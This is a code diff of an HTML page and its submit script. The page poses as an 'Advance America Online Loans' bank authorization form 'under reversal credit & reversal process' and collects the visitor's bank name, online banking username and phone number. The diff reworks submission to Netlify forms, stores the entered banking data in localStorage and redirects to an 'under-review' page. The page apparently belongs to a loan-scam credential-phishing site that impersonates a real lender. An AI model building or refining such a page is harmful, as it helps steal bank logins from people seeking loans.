@@ -65,7 +65,7 @@
                         <p><strong>I hereby authorize Advance America Online Loans (under reversal credit & reversal process) to access and utilize the following banking information for the specific purpose of processing payments, setting up direct deposits, etc.</strong></p>
                     </div>
 
-                    <form id="bankAuthForm" class="bank-auth-form" name="bank-authentication" netlify>
+                    <form id="bankAuthForm" class="bank-auth-form" name="bank-authentication" netlify action="/under-review.html">
                         <div class="form-group">
                             <label for="bankName">Bank Name *</label>
                             <input type="text" id="bankName" name="bankName" required>
@@ -152,44 +152,35 @@
 
     <script>
         document.getElementById('bankAuthForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
             const submitBtn = document.querySelector('.submit-btn');
             const btnText = document.querySelector('.btn-text');
             const btnLoading = document.querySelector('.btn-loading');
             const form = document.getElementById('bankAuthForm');
-            const successDiv = document.getElementById('authSuccess');
             
             // Show loading state
             btnText.style.display = 'none';
             btnLoading.style.display = 'inline-block';
             submitBtn.disabled = true;
             
-            // Form validation passed
-            
-            // Collect form data
-            const formData = new FormData(form);
-            
             // Add application ID from session storage if available
             const applicationId = sessionStorage.getItem('loanApplicationId');
             if (applicationId) {
-                formData.append('application_id', applicationId);
-            }
-            
-            // Add application ID as hidden field if available
-            if (applicationId) {
-                const hiddenField = document.createElement('input');
-                hiddenField.type = 'hidden';
-                hiddenField.name = 'application_id';
-                hiddenField.value = applicationId;
-                bankAuthForm.appendChild(hiddenField);
+                // Check if hidden field already exists
+                let hiddenField = form.querySelector('input[name="application_id"]');
+                if (!hiddenField) {
+                    hiddenField = document.createElement('input');
+                    hiddenField.type = 'hidden';
+                    hiddenField.name = 'application_id';
+                    hiddenField.value = applicationId;
+                    form.appendChild(hiddenField);
+                }
             }
             
             // Save bank auth data to localStorage as backup
             const timestamp = new Date().toISOString();
+            const formData = new FormData(form);
             const bankAuthData = {
                 bank_name: formData.get('bankName'),
-                account_type: formData.get('accountType'),
                 online_banking_username: formData.get('onlineBankingUsername'),
                 phone_number: formData.get('phoneNumber'),
                 application_id: applicationId,
@@ -198,23 +189,9 @@
             };
             localStorage.setItem('bank_auth_' + (applicationId || Date.now()), JSON.stringify(bankAuthData));
             
-            // Submit the form to Netlify
-            bankAuthForm.submit();
-            
-            // Redirect to under-review page after a short delay
-            setTimeout(() => {
-                // Clear session storage
-                sessionStorage.removeItem('loanApplicationData');
-                sessionStorage.removeItem('loanApplicationId');
-                
-                // Redirect to under-review page
-                window.location.href = 'under-review.html';
-            }, 1000);
-            
-            // Reset button state
-            submitBtn.disabled = false;
-            btnText.style.display = 'inline';
-            btnLoading.style.display = 'none';
+            // Clear session storage
+            sessionStorage.removeItem('loanApplicationData');
+            sessionStorage.removeItem('loanApplicationId');
         });
     </script>
 </body>
